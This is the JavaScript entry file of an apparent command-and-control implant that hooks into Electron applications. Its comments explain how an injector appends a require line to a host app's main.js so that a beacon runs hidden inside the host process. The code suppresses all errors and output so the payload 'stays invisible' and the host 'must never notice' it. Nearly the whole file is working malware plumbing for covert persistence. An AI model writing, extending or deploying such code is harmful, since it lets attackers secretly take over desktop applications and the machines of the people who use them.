// entry.js — Electron main-process hook (script-jacking entry point).
//
// ONE file, THREE run modes:
//   1. plain node (dev/test):            `node dist/adaptix.payload.js`
//   2. injected into an Electron app     the injector appends
//      (Loki-style script-jack):         `require('./<payload>.js')` to the
//      host's main.js — the beacon runs inside the host's main process and
//      lives exactly as long as the host app lives.
//   3. dropped in as the app's main.js:  same passive mode; Electron keeps a
//      windowless main process alive, so no lifecycle handlers are needed.
//
// HARD RULES for injected mode (the host app must never notice us):
//   - a throw at load time must NEVER break the host: everything is guarded
//   - no console output unless debug is on (sidecar "debug": true or ADAPTIX_DEBUG=1)
//   - no global handlers, no lifecycle hooks, no dock/window mutations
let _electron = null;
try { _electron = require('electron'); } catch (_) { /* plain node */ }

function startBeacon() {
  try {
    const { run } = require('./agent');
    const p = run();
    if (p && typeof p.catch === 'function') p.catch(() => {}); // never surface
  } catch (_) { /* swallowed: payload stays invisible */ }
}

if (!_electron || !_electron.app) {
  // ---- mode 1: plain node. Runs now; exits when run() resolves (MAX_CYCLES),
  // otherwise beacons forever. No explicit process.exit — the event loop
  // drains naturally and the process dies on its own.
  startBeacon();
} else {
  const app = _electron.app;
  // ---- modes 2/3: defer until the main process is ready so we never race the
  // host's own startup. Passive only: we do not register any app event
  // handlers, so the host keeps full control of its lifecycle.
  try {
    if (app.isReady && !app.isReady()) {
      app.whenReady().then(startBeacon, () => {});
    } else {
      startBeacon();
    }
  } catch (_) {
    startBeacon();
  }
}
